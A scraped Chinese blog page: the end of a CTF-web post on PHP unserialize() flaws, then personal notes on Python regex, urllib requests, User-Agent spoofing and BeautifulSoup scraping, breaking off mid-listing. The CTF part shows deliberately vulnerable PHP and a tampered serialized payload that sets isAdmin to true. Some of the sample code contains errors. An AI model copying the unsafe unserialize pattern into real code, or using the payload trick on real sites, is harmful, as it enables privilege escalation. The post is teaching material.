<p>该程序执行结果：输出序列化字符串<code>0:4:&quot;Site&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;ctf&quot;;&#125;</code></p>
<p><strong>CTF中反序列化题</strong></p>
<blockquote>
<p><code>unserialize()</code>会检查是否存在一个<code>__wakeup()</code>方法，如果存在，则会先调用<code>__wakeup</code>方法，预先准备对象需要的资源。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Site</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);<span class="comment">#c传送post相关数据</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;xxxxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>如果传递一个Site相关序列化内容，__wakeup()就会自动调用，它就会在<code>unserialize()</code>之前执行</p>
<p>所以急需要将<code>class Site</code>的内容复制下来，生成其序列化内容，POST传递给网页即可</p>
<p>再比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>=&gt;isAdmin===ture)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;admin888&#x27;</span>).<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>=&gt;isAdmin===ture)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;xxxxxx&#x27;</span>).<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化生成字符串代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>O:4&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:3:&quot;ctf&quot;;s:7:&quot;isAdmin&quot;;b:0;&#125;</code>这里需要将<code>b:0;</code>改为<code>b:1;</code>也即True，然后POST传参即可</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-web</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2021/03/07/CTF-web-1/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-python爬虫" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2021/03/02/python%E7%88%AC%E8%99%AB/" target="_blank">python爬虫</a>
  
    </h1>
  


  
  
<a href="/2021/03/02/python%E7%88%AC%E8%99%AB/" class="archive-article-date">
        <time datetime="2021-03-02T11:51:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-02</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>Python爬虫篇</center>

<blockquote>
<p>此内容包含简单的基础知识准备，以及爬虫，仅为个人笔记</p>
</blockquote>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>type()</strong></p>
<p>判断括号中的变量类型</p>
<p><strong>%s，%d，%c</strong></p>
<p>在字符串中分别表示字符串类型，int类型和char类型，如下例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我叫&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我叫%s&quot;</span>%a)</span><br></pre></td></tr></table></figure>

<p>两者结果一致</p>
<p>字符中多次出现可以用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d + %d = %d&quot;</span>%(i+<span class="number">1</span>,j+<span class="number">1</span>,(i+<span class="number">1</span>)*(j+<span class="number">1</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>位运算符</strong></p>
<p>假设a&#x3D;60,b&#x3D;13</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>与运算符：参与运算的两个值，如果相应位都为1，则该位的结果为1，否则为0</td>
<td>(a&amp;b)输出结果为12，二进制解释为00001100</td>
</tr>
<tr>
<td>|</td>
<td>或运算符：只要对应两个二进制有一个为1时，结果就为1</td>
<td>(a|b)结果为61，二进制解释为00111101</td>
</tr>
<tr>
<td>^</td>
<td>异或运算符：当对应的两个二进制位相异时，结果为1</td>
<td>(a^b)结果为49，二进制解释为00110001</td>
</tr>
<tr>
<td>~</td>
<td>取反运算符：对数据的每个二进制位取反，即把1变成0,0变成1.~x类似与-x-1</td>
<td>(~a)结果为-61，二进制解释为11000011，在一个有符号二进制数的补码形式</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移动运算符：运算数的二进位全部左移若干位，由”&lt;&lt;”右边数字指定移动位数，高位丢弃，低位补0。</td>
<td>a&lt;&lt;2输出结果240，二进制解释为11110000</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移动运算符：同上</td>
<td>a&gt;&gt;2结果为15，二进制解释为00001111</td>
</tr>
</tbody></table>
<p><strong>进制转换</strong></p>
<p>比如将二进制数0b111100转为十进制，则命令为</p>
<p><code>int(&#39;0b111100&#39;,2)</code>参考int(‘number’,base&#x3D;number)</p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>这里给出一个非常棒的博客链接，写的非常详细</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fozero/p/7868687.html">史上最全正则表达式大全</a></p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>表示任何单个字符</td>
<td></td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集对单个字符给出取值范围</td>
<td>[abc]表示a, b, c, [a-z]表示a到z单个字符</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集，对单个字符给出排除范围</td>
<td>[^abc]表示非a或b或c的单个字符</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符0次或无限次扩展</td>
<td>abc*表示ab, abc, abcc, abccc等等</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符1次或无限次扩展</td>
<td>abc+表示abc, abcc, abccc等等</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符0次或1次扩展</td>
<td>abc?表示ab, abc</td>
</tr>
<tr>
<td>|</td>
<td>左右表达式任意一个</td>
<td>abc|def 表示 abc、def</td>
</tr>
<tr>
<td>{m}</td>
<td>扩展前一个字符m次</td>
<td>ab{2}c表示abbc</td>
</tr>
<tr>
<td>{m,n}</td>
<td>扩展前一个字符m至n次(含n)</td>
<td>ab{1,2}c表示abc、abbc</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc表示abc且在一个字符串的开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>abc$表示abc且在一个字符串的结尾</td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部只能使用 | 操作符</td>
<td>(abc)表示abc，(abc|def)表示abc、def</td>
</tr>
<tr>
<td>\d</td>
<td>数字，等价于[0-9]</td>
<td></td>
</tr>
<tr>
<td>\w</td>
<td>单词字符，等价于[A-Za-z0-9_]</td>
<td>只能包含，数字0-9，大小写字母a-z,A-Z以及下划线</td>
</tr>
</tbody></table>
<p><code>\w</code>的要求所以很多用户名密码不允许出现汉字和其他字符但允许下划线</p>
<p>在python中的re库里的功能有</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>re.search()</td>
<td>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
</tr>
<tr>
<td>re.match()</td>
<td>从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
</tr>
<tr>
<td>re.findall()</td>
<td>搜索字符串，以列表类型范围全部能匹配的子串</td>
</tr>
<tr>
<td>re.split()</td>
<td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
</tr>
<tr>
<td>re.finditer()</td>
<td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td>
</tr>
<tr>
<td>re.sub()</td>
<td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
</tr>
</tbody></table>
<p>正则表达式可以包含一些可选标志修饰符来控制匹配模式。修饰符被指定为一个可选的标志。多个标志可以按位OR(|)来指定。如re.l | re,M 被设置成 I 和 M标志：</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>re.I</td>
<td>使匹配对大小写不敏感</td>
</tr>
<tr>
<td>re.L</td>
<td>做本地化识别(locale-aware)匹配</td>
</tr>
<tr>
<td>re.M</td>
<td>多行匹配，影响^和$</td>
</tr>
<tr>
<td>re.S</td>
<td>使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td>re.U</td>
<td>根据Unicode字符解析字符。这个标志影响\w, \W, \b, \B</td>
</tr>
<tr>
<td>re.X</td>
<td>该标志通过给予你更灵活的格式以便你将正则表达式写的更易于理解。</td>
</tr>
</tbody></table>
<p>给出几个例子</p>
<h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pat = re.<span class="built_in">compile</span>(<span class="string">&quot;AA&quot;</span>)<span class="comment">#AA为正则表达式，用来验证其他字符串</span></span><br><span class="line">s_list=[<span class="string">&quot;NBA&quot;</span>,<span class="string">&quot;ILOVE&quot;</span>,<span class="string">&quot;miaao&quot;</span>,<span class="string">&quot;LALAAa&quot;</span>,<span class="string">&quot;dsAAajvAAAdjiw&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s_list:</span><br><span class="line">    result=pat.search(item)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210302161902430.png" alt="image-20210302161902430"></p>
<p>运行结果如上，无结果返回<code>None</code>，有结果返回对应位置，前闭后开，且只会匹配第一个出现的</p>
<p>也可以简写<code>m=re.search(&quot;AA&quot;,item)</code>（前面为正则匹配规则，后面为查找内容）</p>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h3><p>再如，找出字符串中的所有大写字母</p>
<p><code>re.findall(&quot;[A-Z]&quot;,&quot;ajsSAsdfjlaEifSAKLvioawhS)</code>: 结果[‘S’, ‘A’, ‘E’, ‘S’, ‘A’, ‘K’, ‘L’, ‘S’]</p>
<p><code>re.findall(&quot;[A-Z]+&quot;,&quot;ajsSAsdfjlaEifSAKLvioawhS)</code>: 结果[‘SA’, ‘E’, ‘SAKL’, ‘S’]</p>
<p>输出结果会将字符串中的所有大写字母<strong>单个摘出组成列表返回</strong></p>
<h3 id="sub"><a href="#sub" class="headerlink" title="sub()"></a>sub()</h3><p><code>re,sub(&quot;a&quot;,&quot;A&quot;,&quot;jfdasjASfowihegdFJwqEJFsdfoahewhfHEH&quot;)</code>: <strong>找到a，使用A替换</strong></p>
<p>所以<code>print(re.sub(&quot;[a-z]&#123;2,5&#125;&quot;,&quot;A&quot;,&quot;jfdasjASfowihegdFJwqEJFsdfoahewhfHEH&quot;))</code>意思为连续二到五个小写字母会被替换为A。因此结果为<code>AjASAAFJAEJFAAHEH</code></p>
<p><em><strong>建议在正则表达式中被比较的字符串前加上r，因此不用担心转义字符的问题</strong></em></p>
<h3 id="保存数据（xlwt使用）"><a href="#保存数据（xlwt使用）" class="headerlink" title="保存数据（xlwt使用）"></a>保存数据（xlwt使用）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line">workbook=xlwt.Workbook(encoding=<span class="string">&quot;utf-8&quot;</span>)	<span class="comment">#创建workbook对象</span></span><br><span class="line">worksheet=workbook.add_sheet(<span class="string">&quot;sheet1&quot;</span>)		<span class="comment">#创建工作表</span></span><br><span class="line">worksheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>)			   <span class="comment">#写入数据，第一个参数为行，第二个为列，第三个为内容</span></span><br><span class="line">workbook.save(<span class="string">&quot;test.xls&quot;</span>)				   <span class="comment">#保存格式</span></span><br></pre></td></tr></table></figure>



<h2 id="爬虫部分"><a href="#爬虫部分" class="headerlink" title="爬虫部分"></a>爬虫部分</h2><h3 id="Get方式发送请求"><a href="#Get方式发送请求" class="headerlink" title="Get方式发送请求"></a>Get方式发送请求</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment">#get方式发送请求</span></span><br><span class="line">response=urllib.request.urlopen(<span class="string">&quot;http://www.baidu.com&quot;</span>)<span class="comment">#返回的response是一个class类，所以下句用.read()读取,并且不知道为什么www不能省略</span></span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#防止中文乱码故使用utf-8进行解码</span></span><br></pre></td></tr></table></figure>

<h3 id="Post方式发送请求"><a href="#Post方式发送请求" class="headerlink" title="Post方式发送请求"></a>Post方式发送请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">data=<span class="built_in">bytes</span>(urllib.parse.urlencode(&#123;<span class="string">&quot;hello&quot;</span>:<span class="string">&quot;world&quot;</span>&#125;),encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="comment">#将要发送的post信息二进制加密,utf-8加密</span></span><br><span class="line">response=urllib.request.urlopen(<span class="string">&quot;http://httpbin.org/post&quot;</span>,data=data)<span class="comment">#data为传递的post参数</span></span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="超时处理"><a href="#超时处理" class="headerlink" title="超时处理"></a>超时处理</h3><p>在真实爬虫过程中，为防止各种情况出现的请求超时（如被拦截，发现等等），需要做好准备，可用<code>try···except</code>进行过滤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment">#发送get请求</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	response=urllib.request.urlopen(<span class="string">&quot;http://httpbin.org/get&quot;</span>,timeout=<span class="number">0.1</span>)<span class="comment">#设置时间，如果超出响应时间就为URLError</span></span><br><span class="line">	<span class="built_in">print</span>(response.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time out!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>其中可用<code>print(response.status)</code>来查看相应的状态码，<em><strong>注意418状态码意味着对方发现你是一个爬虫</strong></em>*</p>
<p>响应头可用<code>print(response.getheader())</code>来得到，括号中可添加具体想得到的内容名儿</p>
<h3 id="请求头伪装"><a href="#请求头伪装" class="headerlink" title="请求头伪装"></a>请求头伪装</h3><p>伪装正常浏览器的参数达到爬取的目的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url=<span class="string">&quot;https://httpbin.org/post&quot;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span></span><br><span class="line">&#125;<span class="comment">#此处只伪造了UA，为更像可以构造更多的信息，注意其中为:隔开，类似构造字典</span></span><br><span class="line">data=<span class="built_in">bytes</span>(urllib.parse.urlencode&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isabella&quot;</span>&#125;,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">req=urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&quot;POST&quot;</span>)<span class="comment">#注意两个request的写法</span></span><br><span class="line">response=urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210301233223138.png" alt="image-20210301233223138"></p>
<p>正确返回的结果如上</p>
<h3 id="数据解析"><a href="#数据解析" class="headerlink" title="数据解析"></a>数据解析</h3><p>beautifulsoup的使用</p>
<p>将html分成四个可用节点</p>
<ol>
<li>Tag: 标签</li>
<li>NavigableString: 标签里的字符串内容</li>
<li>BeautifulSoup: 分析好的类</li>
<li>Comment</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;./baidu.html&quot;</span>,<span class="string">&quot;rb&quot;</span>)<span class="comment">#将读取到的html文件打开，rb为读取，二进制写入内存</span></span><br><span class="line">html=file.read()</span><br><span class="line">bs=BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)<span class="comment">#使用html.parser解析器将读取到的html文件解析，方面后续爬虫特定读取</span></span><br><span class="line"><span class="built_in">print</span>(bs.title)<span class="comment">#读取title，（&lt;title&gt;百度一下你就知道&lt;/title&gt;）</span></span><br><span class="line"><span class="comment">#可以用bs.a   bs.head等等读取第一个出现的标签及其内容</span></span><br></pre></td></tr></table></figure>

<p>注意，<strong>只能读取第一个标签以及内容</strong></p>
<p><code>bs.title.string</code>可以省略&lt;title&gt;，而只打印内容也即“百度一下，你就知道”</p>
<h3 id="文档的遍历"><a href="#文档的遍历" class="headerlink" title="文档的遍历"></a>文档的遍历</h3><p><code>print(bs.head.contents)</code>可以打印读取html的头部的内容</p>
<p><code>print(bs.head.contents[1])</code>因为返回的内容是一个列表，所以用[1]来特定读取</p>
<h3 id="文档的搜索"><a href="#文档的搜索" class="headerlink" title="文档的搜索"></a>文档的搜索</h3><ol>
<li>find_all</li>
</ol>
<p><code>t_list=bs.find_all(&quot;a&quot;)</code>: 找到所有a标签，并返回一个列表</p>
<ol start="2">
<li>正则表达式搜索</li>
</ol>
<p><code>search()</code>方法来进行比配内容</p>
<p><code>t_list=bs.find_all(re.compile(&quot;a&quot;))</code>: 需要引入re库，使用正则匹配找到的所有内容中含有a字符的内容（如head也含有a字符）</p>
<p><code>t_list=bs.find_all(re.compile(&quot;\d&quot;))</code>: 应用正则表达式将所有数字内容（标签里的自字符串）找出来</p>
<ol start="3">
<li>根据函数的要求来搜索</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">name_is_exists</span>(<span class="params">tag</span>):</span><br><span class="line">	<span class="keyword">return</span> tag.has_attr(<span class="string">&quot;name&quot;</span>)<span class="comment">#将标签中含有name字符或者属性的找出来</span></span><br><span class="line">t_list=bs.find_all(name_is_exists)<span class="comment">#可以传入写入函数方式进行查找</span></span><br><span class="line"><span class="built_in">print</span>(t_list)</span><br><span class="line"><span class="comment">#对于列表的输出，下面的方式更好看</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> t_list:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>参数搜索</li>
</ol>
<p><code>t_list=bs.find_all(class_=True)</code>: 找出所有带class属性及其子内容<strong>注意class后面接一个下划线_</strong></p>
<p><code>t_list=bs.find_all(href=&quot;http://news.baidu.com&quot;)</code>: 同上，链接参数</p>
<p><code>t_list=bs.find_all(text=&quot;hao123&quot;)</code>: 查找特定内容，<strong>可以传入列表，即text&#x3D;[“1”,”2”,”3”]</strong></p>
<p><code>t_list=bs.find_all(&quot;a&quot;,limit=3)</code>: 限定查找多少个</p>
<ol start="5">
<li>CSS选择器查找</li>
</ol>
<p><code>t_list=bs.select(&quot;title&quot;)</code>: 通过标签筛选</p>
<p><code>t_list=bs.select(&quot;.mnav&quot;)</code>: 通过类名筛选</p>
<p><code>t_list=bs.select(&quot;#u1&quot;)</code>: 通过ID筛选</p>
<p>还可以</p>
<p><code>t_list=bs.select(&quot;a[class=&#39;bri&#39;]&quot;)</code>: 来筛选特定a属性中的特定class类</p>
<p><code>t_list=bs.select(&quot;.mnav ~ .bri&quot;)</code>: mnav标签中的bri子标签内容<code>print(t_list[0].get_text())</code>得到文本，第一个元素的文本内容</p>
<h3 id="爬虫实例"><a href="#爬虫实例" class="headerlink" title="爬虫实例"></a>爬虫实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 